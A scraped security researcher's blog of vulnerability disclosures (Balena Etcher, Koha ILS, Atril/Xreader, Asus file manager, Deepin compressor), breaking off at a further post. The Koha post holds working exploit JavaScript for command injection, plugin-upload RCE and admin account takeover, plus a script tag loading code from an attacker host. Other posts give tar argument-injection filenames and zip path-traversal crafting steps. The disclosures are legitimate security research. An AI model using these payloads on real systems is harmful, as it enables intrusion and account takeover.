=== Content from packetstormsecurity.com_4b93cb40_20250114_220749.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from febin0x4e4a.wordpress.com_b6d1eeb6_20250115_193601.html ===

# [febiNJ](https://febin0x4e4a.wordpress.com/)

## InfoSec Enthusiast

Menu
[Skip to content](#content)

* [Home](https://febin0x4e4a.wordpress.com/)
* [About](https://febin0x4e4a.wordpress.com/about/)

Search

Search for:

# [Privilege Escalation Vulnerability in Balena Etcher Software](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/)

[22nd August 202422nd August 2024](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/08/22/privilege-escalation-vulnerability-in-balena-etcher-software/#respond)

![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/08/etcher.webp?w=1024)

Local Privilege Escalation Vulnerability in Balena Etcher software in Ubuntu/Debian due to a race-condition issue.

Severity: **Medium**

Etcher is a popular cross-platform tool from balena.io to flash OS images onto SD cards and USB drives safely and easily. It is one of the most-popular USB flashing tools.

A Local Privilege Escalation flaw has been discovered in the latest version of Etcher <= v1.18.11 that allows an attacker with a low-privileged user account to create a directory named “etcher”
under /tmp, when the Admin user runs Etcher in his session, the attacker can achieve LPE.

This vulnerability arises due to the fact that, when someone runs Etcher, it creates a temporary directory under /tmp and writes a file under /tmp/etcher and the file will look something like “balena-etcher-electron-[random-uuid].cmd. Etcher then prompts for root/admin password, when admin enters the password, it then calls /tmp/etcher/balena-etcher-electron-[random-uuid].cmd and executes it with root privileges. Etcher then deletes the file and /tmp/etcher will be removed after a system reboot.

An attacker with a low-priv user account can exploit this behavior by creating his own /tmp/etcher directory, when the admin or any other user runs Etcher, it will write balena-etcher-electron-.cmd under attacker-owned /tmp/etcher directory.
The Attacker may not directly overwrite the file /tmp/etcher/balena-etcher-electron-[random-uuid].cmd because the file is created and owned by the admin or the user who ran Etcher, the attacker can just delete the /tmp/etcher directory as he is the owner of the directory and then he can again create /tmp/etcher directory and create a file that has exactly the same name as the file “balena-etcher-electron-[random-uuid].cmd” which is created by Etcher before. Etcher will then run the attacker’s malicious commands instead of the actual commands that are supposed to run.

Etcher creates the file before the password prompt and runs after the user enters the root/admin password, this is where the Race-Condition happens, attacker can create an automated script that creates /tmp/etcher and monitors it constantly, if a file is being created under /tmp/etcher it immediately deletes the directory and creates a fake /tmp/etcher/balena-etcher-electron-[random-uuid].cmd.

Limitation: The only limitation of the exploit is that while running the exploit, if there’s already /tmp/etcher present that means someone already ran Etcher Software before the exploit, a system reboot is required i.e., if there’s already a /tmp/etcher directory is present and that’s not owned by the attacker then the attacker should wait for a reboot.

Demo Scenario:

1. An attacker with a low privileged user (low-priv) access to the target.

2. Admin privileged user running etcher (adminuser) in Ubuntu.

Demo video: <https://github.com/febin0x10/etcher_privesc_exploit/raw/main/Etcher_privilege_escalation_linux_by_Febin.mp4>

Download Exploit: <https://github.com/febin0x10/etcher_privesc_exploit.git>

Software Information:

Etcher is a popular SD card flasher app that is simple for end users, extensible for developers, and works on any platform.

Official Website: <https://etcher.balena.io/>
Github Repo: <https://github.com/balena-io/etcher>
Download Vulnerable version(.deb): <https://github.com/balena-io/etcher/releases/download/v1.18.11/balena-etcher_1.18.11_amd64.deb>

Update Etcher to its latest version!

# [CVE-2024-28739, CVE-2024-28740: XSS to One-Click RCE in Koha ILS](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/)

[7th March 202417th April 2024](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/03/07/xss-to-one-click-rce-in-koha-ils/#respond)

```
![](https://febin0x4e4a.wordpress.com/wp-content/uploads/2024/03/koha2.png)

PART-1 (Arbitrary Command Injection) [CVE-2024-28739]

An Arbitrary Command injection vulnerability has been discovered in the latest version (23.05) of Koha ILS. The vulnerability is present in the Task Scheduler feature, which allows arbitrary input from the user and appends it to a system command.
An Attacker can Schedule a task and intercept and modify the HTTP request using a proxy tool like BurpSuite and inject arbitrary system commands with backticks (`) inside the "format=" parameter, the arbitrary command will then execute on the system at the scheduled time.

Severity: HIGH

The HTTP request will look something like this:

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

The command Task Scheduler is scheduling a command on the system that will look something like this:

export KOHA_CONF="/etc/koha/sites/library/koha-conf.xml"; /usr/share/koha/bin/cronjobs/runreport.pl 1 --format=text --to=

Steps to Reproduce:

1. Log in to Koha Intranet as Admin Staff
2. Go to Task Scheduler (/cgi-bin/koha/tools/scheduler.pl)
3. Schedule a task, and set the time for the job to execute (current server time+2 minutes)
4. Intercept the HTTP Request and Inject any arbitrary command

mode=job_add&starttime=[TIME here]&startdate=&report=1&format=text`[Arbitrary Command here]`&email=

5. Forward the request.
6. Important thing to note here is that this is a Blind Arbitrary Command Injection i.e., we wouldn't be able to see the command output but it will execute anyways. So use "whoami>/tmp/whoami.txt" as the injection command.

mode=job_add&starttime=09%3A40&startdate=&report=1&format=text`whoami+>/tmp/whoami.txt`&email=

7. Wait for some time and you will be able to see a file named whoami.txt being created in/tmp directory on the target server, if you read it will see "library-koha"(koha system username).

PART-2 (XSS to RCE) [CVE-2024-28740]

The above command injection vulnerability can only be exploited if the adversary has the credentials for the Koha Intranet Staff Admin user! Any ways to exploit this without having credentials? The answer is yes! We can trigger this RCE vulnerability just by sending the admin a URL/Link.

This can be achieved by abusing the "Additional contents (HTML customizations)" feature in Koha. This is basically a Cross-Site Scripting (XSS) vulnerability that can be used to bypass CSRF protections in Koha (SameSite=Lax cookie attribute and csrf_token). The HTML customizations feature allows the admin to add HTML content, it also accepts custom javascript.

This is where the problem arises, the attacker can carefully craft a URL with some malicious javascript that adds a task to Task Scheduler to trigger the Command Injection Vulnerability when the admin Staff patron loads the URL in his browser with an authenticated session of Koha, it will add the malicious script to "Additional contents" and the javascript will be executed. In this way, the attacker can gain access to the target system.

In fact, there's an httpOnly flag set for the cookie by Koha and Javascript can't just read the session cookie, this XSS can also be used to steal the CSRF token and forcefully change username and password to completely takeover the Admin Staff account.

If there is Plugin upload feature enabled by the admin, this can be used to drop a malicious plugin to Koha in the background to achieve Remote Code Execution on the target system.

 Proof-Of-Concept:

1. Open Koha Intranet URL
2. Navigate to
[Your Koha domainname]/cgi-bin/koha/tools/additional-contents.pl?op=add_validate&category=html_customizations&code=&idnew=38&redirect=/&editmode=wysiwyg&location=&&title_default=test&content_default=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&lang=default

This will execute a simple javascript alert to prove the existence of the vulnerability

I have developed fully working exploits for all the above issues (Authenticated RCE, XSS to RCE, XSS to Account takeover, XSS to plugin upload RCE),

i) I have developed Javascript code that directly uploads malicious plugins to Koha and enables the plugin without any Account takeover.

ii) To reproduce the issue, you may host the JS code yourself and include it in the XSS payload like '<script src="http://your.attacker.machine/xsrf_plugin.js"></script>'

xsrf_plugin.js:

-----------------------------------------------------------------
```
function csrf_to_rce(){

function dataURItoBlob(dataURI) {

  var byteString;

  if (dataURI.split(',')[0].indexOf('base64') >= 0)
    byteString = atob(dataURI.split(',')[1]);
  else
    byteString = unescape(dataURI.split(',')[1]);

  // separate out the mime component
  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

  // write the bytes of the string to a typed array
  var ia = new Uint8Array(byteString.length);

  for (var i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ia], {
    type: mimeString
  });
}

var dataUri = "data:application/zip;base64,UEsDBAoAAAAAAHpk91YAAAAAAAAAAAAAAAAFABwAS29oYS9VVAkAA1DRvGSM0bxkdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAAJVI+FYAAAAAAAAAAAAAAAAMABwAS29oYS9QbHVnaW4vVVQJAANS8b1kXPG9ZHV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAD2s/RWAAAAAAAAAAAAAAAAEAAcAEtvaGEvUGx1Z2luL1JjZS9VVAkAA3douWQyMr1kdXgLAAEEAAAAAAQAAAAAUEsDBBQAAAAIAJVI+FbYjsVGowEAAEYDAAASABwAS29oYS9QbHVnaW4vUmNlLnBtVVQJAANR8b1kMjK9ZHV4CwABBAAAAAAEAAAAAJVRXWvcMBB8169YzEEukFx8CX2Iy4XSkkIpbcMV8irW9t5ZjSU5+mh6lPz3rnxyc0nzUmEse3Z2d2ZXDNjc4Zbgs+2wqm76uFWmqtYNvRUieoIvtiXHyA25PkM18uv+YX6Y4qvqPcPHTLHRwez2ev3907evsIKiXCyLCdYUsMWAjP8WwMegJjg4qys44uZHJ2MUY+isex79SLUyOc6lSO5J1Ob4eXm+PC0vTsvLQ1Ic0tXmIsUTqdiTtDJKRy1/kvPKmrHS8nJRvlmUJT9lrqXx10taNC1t9tEJPZA7DSJLId84NYSJlLqETnkYxiECf60/XHOvRx6Y3/lAel48dBa1ujoLejgj0/A+ijRmseoI2wuoacPupSfTSk3e8zK9EPutQGftHYQOA7hoPDi17ULOYJggJ8B9pEip/eBswxi1grPzz1RWjqzF0HPvJgaW4GP9av+8XL2DOcw89ZsTmA3oUHs45tW/k6w/EV6ziFoq6awNyeXjX5uNs+aHraVJFvrdc4dsziizhTQc2DirAccE4IxJbNL6osg/Mv9fnRBLZv8BUEsBAh4DCgAAAAAAemT3VgAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAEtvaGEvVVQFAANQ0bxkdXgLAAEEAAAAAAQAAAAAUEsBAh4DCgAAAAAAlUj4VgAAAAAAAAAAAAAAAAwAGAAAAAAAAAAQAO1BPwAAAEtvaGEvUGx1Z2luL1VUBQADUvG9ZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAPaz9FYAAAAAAAAAAAAAAAAQABgAAAAAAAAAEADtQYUAAABLb2hhL1BsdWdpbi9SY2UvVVQFAAN3aLlkdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAlUj4VtiOxUajAQAARgMAABIAGAAAAAAAAQAAAO2BzwAAAEtvaGEvUGx1Z2luL1JjZS5wbVVUBQADUfG9ZHV4CwABBAAAAAAEAAAAAFBLBQYAAAAABAAEAEsBAAC+AgAAAAA=";

var blob = dataURItoBlob(dataUri);

         var formData = new FormData(),
          request  = new XMLHttpRequest();
          request.withCredentials = true;

    /** Configure the request */
    request.open( "POST", "http://library.kali.local:8001/cgi-bin/koha/plugins/plugins-upload.pl", true );

    formData.append( "uploadfile", blob, "feb.kpz" );
    formData.append("op","Upload");
    request.send(formData);
   }

csrf_to_rce();
fetct("/cgi-bin/koha/plugins/plugins-enable.pl?class=Koha::Plugin::Rce&method=enable"); //Plugin Enable

```
----------------------------------------------------------------

This above Javascript code will directly upload plugin without Account takeover.
The plugin will execute whoami command and stores it's output to /tmp/encode

3. I have created working JS code for Command Injection and Account takeover as well

rce.js:

-----------------------------------------------------------
```
fetch("/cgi-bin/koha/tools/scheduler.pl").then(response => response.text()).then((response) => {
window.server_time = response.match(/([0-9]{2}:[0-9]{2})/)[1];

var cmd = "whoami >/tmp/xss_sh";
var b64cmd = encodeURIComponent(btoa(cmd));
var inject = "echo+"+b64cmd+"|base64+-d|bash"
var hour = server_time.split(":")[0];
var min = server_time.split(":")[1];

if (Number(min)+2 > 60){
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = String(Number(hour)+1)

fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
} else {
var sc_min = (Number(min)+2)%60
var strMin = `${sc_min}`.padStart(2, '0');
var strHr = hour
fetch("/cgi-bin/koha/tools/scheduler.pl?mode=job_add&starttime="+strHr.padStart(2,"0")+":"+strMin+"&startdate=&report=1&format=text`"+inject+"`&email=");
}
 }).catch(err => console.log(err))

```
-----------------------------------------------------------

This above code will fetch server time from the target and schedules a task(server time + 2 minutes) with the arbitrary injected command.

xsrf_ato.js (Account takeover):

-------------------------------------------------------------
```
fetch("/cgi-bin/koha/members/member-password.pl?member=1").then(response => response.text()).then((response) => {window.csrf_token = response.match(/value=\"(.{92})\"/)[1];
const xhr = new XMLHttpRequest();
xhr.open("POST","/cgi-bin/koha/members/member-password.pl",true);
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send("destination=&borrowernumber=1&member=1&newuserid=admin&newpassword=Koha@pwn1234&newpassword2=Koha@pwn1234&csrf_token="+csrf_token);
}).catch(err => console.log(err))

```
-------------------------------------------------------------

This above JS will steal the CSRF token and performs a password reset. It sets admin:Koha@pwn1234 as Admin Staff credentials.

Thanks for reading,
Febin

```

# [CVE-2023-44452, CVE-2023-51698: CBT File Parsing Argument Injection that affected Popular Linux Distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/)

[17th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44452-cve-2023-51698-cbt-file-parsing-argument-injection-that-affected-popular-linux-distros/#respond)

*A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.*

My 9th and 11th CVEs

**Affected Operating Systems:**

Linux Mint
Kali Linux (Popular OS among Security professionals, and researchers)
Parrot OS (Popular OS among Security professionals, and researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers) and Xreader Document Viewer (Default doc reader in Linux Mint)

**Vulnerability Summary:**

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Linux Mint Xreader. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file.

The specific flaw exists within the parsing of CBT files. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of the current user.

This vulnerability is due to a bad code segment in Atril and Xreader responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause – Vulnerable Code segment in both doc viewers (comics-document.c):

```

static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
    {"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
    {NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
    {"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
    {NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
    {"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

    /* UNARCHIVER */
    {"unar -o -"        , "%s %s"          , NULL         , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /\* tar \*/ section, it actually calls the following shell command, “tar -xOf -tf ![]()“. This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program ‘–checkpoint-action’ to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like ‘–checkpoint-action=EXEC=bash -c “whoami>/tmp/who.txt”;.jpg’.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril and Xreader are forks of Evince, this vulnerability was present in both Atril and Xreader. Atril’s team fixed the vulnerability at that time by adding a piece of code that quits Atril’s process if the CBT file with “–checkpoint-action=” in its name. The following was the patch (comics-document.c) (line – 983):

```

extract_argv (EvDocument *document, gint page)
{
    ComicsDocument *comics_document = COMICS_DOCUMENT (document);
    char **argv;
    char *command_line, *quoted_archive, *quoted_filename;
    GError *err = NULL;

    if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
    {
        g_warning ("File unsupported\n");
        gtk_main_quit ();
    }

```

As you can see, it throws a “File Unsupported” message to the console and quits when it sees “–checkpoint-action=” in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the “gtk\_main\_quit ();” function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

In Linux Mint (Cinnamon Desktop Environment), the target user must open the document to trigger the payload because Linux Mint uses Xreader and Xreader doesn’t have a previewer.

**Exploit**: <https://github.com/febinrev/atril_cbt-inject-exploit.git>

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

**Github Advisory on MATE Atril**: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

**Zero Day Initiative Advisory on Mint Xreader**: <https://www.zerodayinitiative.com/advisories/ZDI-23-1836/>

Thanks for Reading!

# [CVE-2023-44451, CVE-2023-52076: EPUB File Parsing Directory Traversal RCE Vulnerability affecting popular distros](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/)

[17th January 202417th January 2024](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/17/cve-2023-44451-cve-2023-52076-epub-file-parsing-directory-traversal-rce-vulnerability-affecting-popular-distros/#respond)

My 8th and 10th CVEs

**Slippy-book: EPUB File Parsing Directory Traversal Remote Code Execution**

### CVE-2023-44451 (Xreader), CVE-2023-52076(Atril)(Reserved):

RCE Vulnerability affected popular Linux Distros including Mint, Kali, Parrot, Manjaro etc. EPUB File Parsing Directory Traversal Remote Code Execution

A Critical Path traversal and Arbitrary file write vulnerability has been discovered in the default document viewer software of Linux’s MATE/ and Linux Mint affecting popular operating systems such as Kali Linux, Parrot Security OS, Ubuntu-Mate, Linux Mint, Xubuntu, and all the other Operating Systems that use MATE or Atril/Xreader as default doc viewer.

The vulnerability exists in Atril Document Viewer and Xreader Document Viewer which are the default document viewers of the MATE environment and Linux Mint respectively. Atril is the default document reader for Kali Linux, Ubuntu-Mate, Parrot Security OS, and Xubuntu, and Xreader is the default document reader for Linux Mint.

This vulnerability is capable of writing arbitrary files anywhere on the filesystem to which the user opening a crafted document has access, the only limitation is that this vulnerability cannot be exploited to overwrite existing files but that doesn’t stop an attacker from achieving Remote Command Execution on the target system.

I named this vulnerability “*Slippy-Book*“

**Severity**: CRITICAL

**Impact**: Remote Command Execution, System compromise

This can be used particularly against security researchers who mostly use Kali and Parrot OS and also desktop users who use Linux Mint.

Remote Command Execution can be achieved in many ways:

1. The most efficient way to achieve RCE is by placing a malicious .desktop entry under $HOME/.config/autostart/ directory, and the .desktop will execute when the user logs out and logs back in, the autostart/ directory acts as the startup folder in Windows, and it will execute all the .desktop entries that are present inside at startup. We can place an infinite number of .desktop files with random names under autostart/ directory to achieve RCE, no need to overwrite any file.
2. By writing the authorized\_keys file under the .ssh/ directory inside the user’s home, in this way, an attacker can immediately achieve Command Execution via SSH if the target system has SSH enabled.
3. RCE can be achieved in another way just by writing files like .bash\_profile, .bash\_login, .zshrc, .cshrc, .vimrc, .xsession under the user’s home directory. Many of these files might be missing in operating systems, it depends on the OS. In Ubuntu-mate and Linux Mint, .bash\_profile, and .bash\_login files won’t be present, and placing those files with malicious commands written inside under the user’s home directory will result in RCE if the user logs in to the system without GUI mode, like SSH login.
4. Another way to achieve control over the target system is by writing files in places like ~/.local/bin, ~/.local/lib/python3.9/site-packages/, ~/.local/lib/python3.10/site-packages/, ~/.local/lib/python3.11/site-packages/, ~/.local/share/applications/, /var/www/html/, /var/www/ and so on.

**[+] Finding the Vulnerability:**

I was researching archive file formats such as Zip, Tar, Rar, etc., and the software that works with archives, then I got the idea to get into the Ebook file format (.epub) because .epub files are really Zip archives with some XML, HTML and other files packed inside. Even though Epub files are just zip files, epub format has its own standards.

**[\*] How did I find the vulnerability?**

People have been exploiting Archives since the early 2000s, researchers are constantly looking into Archives and archiving software for vulnerabilities and Zero-day acquisition companies like Zerodium are willing to pay million-dollar bounties for zero-days in archives and archivers. So, I thought to give it a try. I am not a binary ninja or kernel exploitation specialist to pull off a highly complicated exploit chain that could give me a code execution or elevation of privilege. My approach was, “What is the dumbest thing that could possibly work”.

Path traversal is one of the most common vulnerabilities that affect Archives and software that deals with archives, Zip Slip is one such vulnerability that leads to arbitrary file overwrite and Code execution that was disclosed on the 5th of June 2018 by the Snyk Security team, Zip Slip was a widespread vulnerability affected many software and libraries that handle Zip archives. Path traversal in zip archives was an ancient bug in the wild even before that was disclosed by the Snyk Security team. It is still present in many software including some Android file managers.
Another such vulnerability was discovered in WinRar with the CVE Id CVE-2018-20250, in which a potential path traversal can be exploited to achieve RCE.

Archives were developed in a period when people not much cared about security, and that’s where all the problems began.

Knowing that Path traversals can be a problem in the archive, I started testing it out on EPUB. I started off by downloading a sample .epub file from the internet and started playing with it. Then I did something really interesting, I added my own files into the .epub file by using the “zip -u” command.

`$ zip -u sample1.epub hello.txt`

And then when I listed the contents of the EPUB archive using “unzip -l”, I was able to see my hello.txt was present inside the EPUB. Perfect! So what’s next? As I said above, my approach was, “What is the dumbest thing that could possibly work” so what I did next was add a bunch of Path Traversal gadgets (../../) at the beginning of my filename hello.txt.

I was using Kali Linux and logged in as root during the research on archives.
Then, I navigated to the directory graphically and clicked on the EPUB document, the document opened up and nothing happened but after that, I noticed something really interesting, the hello.txt file was present under my Kali Linux’s root (/). I tried overwriting existing files but that didn’t work.

Then, I tried changing the filename to something like ../../../../tmp/test.txt and that worked too, a file named test.txt was successfully created under /tmp upon opening the epub document. First I thought it was a vulnerability in Kali Linux and downloaded the latest ISO of Kali from their official site and built a VM to test it out. Guess what? It worked on the latest version of Kali too. The software responsible for opening epub files in Kali is Atril, I then went to Google to read more about Atril Document Viewer and found out that it is the default Document reader for MATE desktop environment. After knowing that, I immediately switched to my Parrot OS VM to reproduce the same vulnerability, and that worked in Parrot OS as well. I also tested it out on Ubuntu’s MATE variant called Ubuntu-MATE and found that it was also vulnerable. The MATE desktop environment itself is vulnerable.

I also tried to reproduce this on various other Linux distros with other Desktop Environments and found out that Linux Mint is also vulnerable.

#### [+] Achieving Remote Command Execution:

This vulnerability can’t be exploited to overwrite existing files, it can only create new files under any specified locations, but that doesn’t stop us from achieving RCE. I tried out using the vulnerability to write a .desktop entry under $HOME/.config/autostart and then I logged out and logged back in, the malicious .desktop entry got triggered and I got Remote Command Execution. I also tried placing an authorized\_keys file under .ssh/ directory and achieved RCE via SSH. Note: If a directory is not present it will create the directory automatically.

Who knows about the Ebook format? Hasn’t everyone switched to PDF?

The answer is no, EPUB is still a popular and powerful document format, but many people prefer PDF. Most of them are familiar with PDFs. So, I was trying to maximize this vulnerability impact. Another Interesting thing I noticed was, when renaming the .epub document to something.pdf, the vulnerable Document Viewer (Atril/Xreader) tries to open the something.pdf file and reads it as an EPUB document because it is responsible for reading both EPUB and PDF, it also supports many other document formats as well. In other words, we can rename our crafted something.epub to something.pdf and then send it to the target to achieve RCE on the target.

So everything is good, we could create an exploit that’ll craft an epub/pdf pair to write malicious .desktop entries under /home//.config/autostart/ directory. But there’s a small problem, the target user’s username is required for successful exploitation of this bug. What if we don’t know the username? No Easy RCE? Needs to guess Username? Needs to try random common usernames? Let’s see what I got..

Upon further analysis, I found out that we can use the /proc/self/cwd to access the user’s home directory if he downloads the crafted document and opens it somewhere inside his home directory such as the ~/Downloads/, ~/Documents/ directory. So we can exploit the path traversal bug to achieve RCE just by using the gadget ../../../../../proc/self/cwd/../.config/autostart/exploit.desktop.

I have created a fully working exploit for this vulnerability (exploit\_rce.sh) and a script to write and include custom files for path traversal (exploit\_file\_write.sh).

**Exploit**: <https://github.com/febinrev/slippy-book-exploit.git>

**Zero Day Initiative Advisory:** <https://www.zerodayinitiative.com/advisories/ZDI-23-1835/>

*Update the Document Viewers to the latest version on your Distros!*

Thanks for Reading.

# [Zip Path Traversal in Asus Smartphone’s default FileManager App.](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/zip-path-traversal-in-asus-smartphones-default-filemanager-app/#respond)

**Zip Path traversal(ZipSlip) to arbitrary file write/overwrite in Asus default Android FileManager affecting all Asus Smartphones.**

This vulnerability is found in the latest version of the default file manager of Asus smartphones which comes pre-installed with the devices and also can’t be uninstalled. An attacker can create a crafted zip archive with path traversal to write/overwrite files in arbitrary locations on the target Smartphone. This vulnerability is dangerous as this can be abused to overwrite targetted files on the victim device or overwrite files that have patterns in the filenames like the photos taken from the camera, WhatsApp audio messages, WhatsApp Voice notes, Telegram Files, and much more. Also, Asus FileManager doesn’t prompt user confirmation before overwriting existing files which makes it easier for an attacker to exploit the vulnerability to overwrite existing files on the victim’s device.

**Severity**: *HIGH*

Affected Software and Version: Asus File Manager(com.asus.filemanager) <= 2.8.0.85\_230220 latest

**Proof-Of-Concept:**

1. Craft a path-traversal zip archive (here I created it on my Linux machine)

`$ echo PWNED > 001001001001001sdcard1poc1pwn.txt`

`$ zip trav.zip 001001001001001sdcard1poc1pwn.txt`

`$ sed -i s/"0"/"."/g trav.zip`

`$ sed -i s/"1"/"\/"/g trav.zip`

2. Transfer the zip file (trav.zip) to the Asus or Tecno device.
3. Open the archive and extract it with the default file manager
4. You will be able to see a file named pwn.txt under /sdcard/poc/pwn.txt

**Tested Devices:**

Asus Rog phone 5 and other devices with Asus Filemanager installed

# [CVE-2023-50255: Critical RCE Vulnerability in Deepin Linux’s default Archiver.](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/)

[10th January 2024](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2024/01/10/cve-2023-50255-critical-rce-vulnerability-in-deepin-linuxs-default-archiver/#respond)

## Zip Path Traversal (ZipSlip) in Deepin-Compressor

This is my 7th Published CVE.

## Description

Deepin-Compressor is the default archive manager of Deepin Linux OS. A path traversal vulnerability in deepin-compressor can be exploited to achieve Remote Command Execution on the target system upon opening crafted archives.

### Details

While decompressing/extracting zip archives, deepin-compressor is not validating the file names. Adding one or more “../” as prefixes to the filenames will lead to path traversal. This leads to arbitrary file write and RCE.

### PoC

Steps to create such zip archive:

1. Create a file for traversal

```

echo "TEST" > XXYXXYXXYtmpYpoc.txt

```

2. Make a normal zip archive

```

zip poc.zip XXYXXYXXYtmpYpoc.txt

```

3. Craft malicious archive

```

sed -i s/"XXY"/"..\/"/g poc.zip
sed -i s/"tmpY"/"tmp\/"/g poc.zip

```

By following the above steps, you can create a malicious zip archive, upon extracting that archive, a file named poc.txt will be created under /tmp directory

### Impact

Remote Command Execution: By exploiting the vulnerability an attacker can place malicious desktop entries under ~/.config/autostart to achieve RCE on the target

**Fix**: If you’re using Deepin Linux, update deepin-compressor to the latest version 5.12.21

# [CVE-2023-50254: Critical RCE in Deepin Linux Desktop OS’s default document reader](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/)

[22nd December 202322nd December 2023](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/) / [FebiNJ](https://febin0x4e4a.wordpress.com/author/febin0x4e4a/)  / [Leave a comment](https://febin0x4e4a.wordpress.com/2023/12/22/cve-2023-50254-critical-rce-in-deepin-linux-desktop-oss-default-document-reader/#respond)

This is my 6th published CVE.

### Summary

